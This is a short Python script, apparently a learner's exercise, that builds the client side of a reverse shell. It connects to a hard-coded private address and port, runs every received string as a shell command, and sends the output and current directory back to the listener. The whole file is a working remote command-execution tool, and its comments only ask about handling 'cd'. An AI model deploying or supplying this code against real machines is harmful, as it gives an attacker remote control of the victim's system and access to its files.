#!/usr/bin/env python3

'''
create client
'''

import socket
import os
import subprocess


host = "192.168.122.70"
port = 9999
s = socket.socket()

s.connect((host, port))

while True:
    data = s.recv(1024)
    # cause commands like cd doesn't return anything
    # also why do we need this data check
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    # directory like "cd <some_folder>" is already done above so below gives error
    # also why doesn't "cd .." executed again from below
    if len(data) > 0:
        cmd = subprocess.Popen(
            data[:].decode("utf-8"),
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        # also show cwd in prompt
        currentwd = os.getcwd() + " $ "
        s.send(str.encode(output_str + currentwd))

        # if you want to output also in client side then print
        print(output_str)
